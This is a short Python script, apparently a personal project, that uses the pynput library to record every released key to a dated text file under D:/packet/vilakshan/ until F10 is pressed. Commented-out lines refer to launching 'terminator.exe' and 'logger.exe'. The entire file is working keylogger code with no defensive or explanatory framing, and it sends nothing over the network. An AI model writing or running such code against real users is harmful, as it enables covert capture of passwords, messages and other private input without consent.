from pynput.keyboard import Key, Listener
import keyboard
import os
from datetime import date,time,datetime
date=date.today()
time=datetime.now()
#os.system("start D:/packet/terminator.exe")
name=("D:/packet/vilakshan/"+str(date)+"vilakshan.txt")
logger=open(name,"a+")
logger.write("\n\n\t\t"+str(time)[11]+str(time)[12]+":"+str(time)[14]+str(time)[15]+"\n")
def on_press(key):
    if key==Key.f10:
        logger.close()
        #os.system("start D:/packet/logger.exe")
        return False
def on_release(key):
    logs=str("{}".format(key))
    logger.write(logs)    
with Listener(on_press,on_release) as listener:
    listener.join()
        



